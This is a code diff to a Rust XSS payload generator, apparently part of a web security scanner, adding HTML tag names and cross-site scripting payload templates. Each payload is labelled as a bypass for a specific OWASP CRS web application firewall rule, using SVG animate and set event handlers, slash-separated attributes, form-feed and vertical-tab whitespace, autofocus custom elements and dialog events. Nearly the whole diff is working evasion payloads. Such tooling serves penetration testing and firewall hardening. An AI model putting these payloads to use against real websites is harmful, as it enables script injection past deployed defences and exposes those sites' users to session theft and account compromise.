@@ -8,6 +8,8 @@ pub fn useful_html_tag_names() -> &'static [&'static str] {
         "script", "img", "svg", "iframe", "math", "xmp", "details", "video", "audio", "object",
         "embed", "marquee", "body", "meta", "link", "input", "form", "textarea", "select",
         "template",
+        // Uncommon/newer tags that may bypass WAF denylists (CRS 941110)
+        "dialog", "search", "slot", "animate", "set", "isindex",
     ]
 }
 
@@ -56,6 +58,25 @@ pub fn get_dynamic_xss_html_payloads() -> Vec<String> {
         "</title><IMG src=x onerror={JS} id={ID}>",
         "</textarea><IMG src=x onerror={JS} id={ID}>",
         "</noscript><IMG src=x onerror={JS} id={ID}>",
+        // ── CRS bypass: uncommon tags and events ──────────────────────
+        // SVG animate/set elements — may not be in CRS 941110 tag denylist
+        "<svg><animate onbegin={JS} attributeName=x dur=1s class={CLASS}>",
+        "<svg><set onbegin={JS} attributename=x to=1 class={CLASS}>",
+        // Slash-separated attributes — bypasses CRS 941160 regex expecting whitespace
+        "<svg/onload={JS}/class={CLASS}>",
+        "<img/src=x/onerror={JS}/class={CLASS}>",
+        "<details/open/ontoggle={JS}/class={CLASS}>",
+        // Exotic whitespace (form feed) — bypasses CRS 941320 \\s pattern
+        "<img\x0Csrc=x\x0Conerror={JS}\x0Cclass={CLASS}>",
+        "<svg\x0Bonload={JS}\x0Bclass={CLASS}>",
+        // marquee with onstart (older browsers, rare in WAF denylists)
+        "<marquee onstart={JS} class={CLASS}>",
+        // Custom elements with tabindex+autofocus trick
+        "<x-a onfocus={JS} tabindex=0 autofocus class={CLASS}>",
+        // MathML context with onclick
+        "<math><mi onclick={JS} class={CLASS}>x</mi></math>",
+        // Dialog element
+        "<dialog open onclose={JS} class={CLASS}>",
     ];
     let mut out = Vec::new();
     for js in crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL.iter() {
